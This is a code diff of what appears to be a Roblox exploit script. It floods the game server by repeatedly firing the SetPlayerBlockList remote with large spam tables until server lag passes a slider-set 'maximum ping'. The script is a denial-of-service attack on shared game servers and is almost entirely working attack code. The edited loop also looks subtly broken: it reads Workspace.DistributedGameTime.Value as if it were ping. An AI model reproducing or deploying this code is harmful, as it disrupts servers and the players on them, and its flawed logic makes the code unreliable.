@@ -38,7 +38,7 @@ end)
 local maxPing = 200;
 b:Slider("Maximum Ping",{
     min = 50;
-    max = 1000;
+    max = 500;
     precise = false;
 },function(value)
     maxPing = value
@@ -84,19 +84,17 @@ while wait(0.6) do
                 table.insert(maintable, spammedtable)
             end
             
-            for i = 1, tries do
-                game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+            while true do
+                local ping = game.Workspace.DistributedGameTime.Value
+                if ping >= maxPing then
+                    break
+                end
+                for i = 1, tries do
+                    game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+                end
             end
         end
         
-        local function getPing()
-            return game:GetService("Players").LocalPlayer.Ping
-        end
-        
-        while getPing() < maxPing do
-            bomb(tableValue, bombValue)
-            wait()
-        end
-        toggle = false
+        bomb(tableValue, bombValue)
     end
 end
